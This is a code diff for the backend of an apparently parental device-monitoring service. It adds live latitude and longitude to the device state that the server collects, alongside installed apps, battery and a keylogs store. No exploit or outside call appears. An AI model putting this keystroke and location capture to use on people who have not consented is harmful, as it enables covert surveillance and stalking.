@@ -39,9 +39,7 @@ async function setupDatabase() {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-
     await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'parent'`);
-
     await pool.query(`
       CREATE TABLE IF NOT EXISTS devices (
         id SERIAL PRIMARY KEY,
@@ -55,11 +53,9 @@ async function setupDatabase() {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id VARCHAR(255)`);
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
-
     console.log("Database ready.");
   } catch (err) {
     console.error("Setup failed:", err);
@@ -121,14 +117,13 @@ app.get("/api/me", requireLogin, async (req, res) => {
   } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
 });
 
-// Device state upsert
 const deviceStates = new Map();
 const keylogs = [];
 const deviceUIs = new Map();
 
 app.post("/api/device-state", async (req, res) => {
   try {
-    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps } = req.body;
+    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude } = req.body;
     if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });
 
     const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
@@ -152,6 +147,8 @@ app.post("/api/device-state", async (req, res) => {
       deviceName: deviceName || "Unknown Device",
       battery: battery ?? 0,
       installedApps: installedApps || [],
+      latitude: latitude ?? null,
+      longitude: longitude ?? null,
       last_seen: Date.now()
     });
     res.json({ success: true });
@@ -166,7 +163,7 @@ app.get("/api/device-state", requireLogin, async (req, res) => {
     return res.status(403).json({ error: "Not your device." });
   }
   const live = deviceStates.get(deviceId);
-  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], last_seen: 0 });
+  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], latitude: null, longitude: null, last_seen: 0 });
   res.json(live);
 });
 
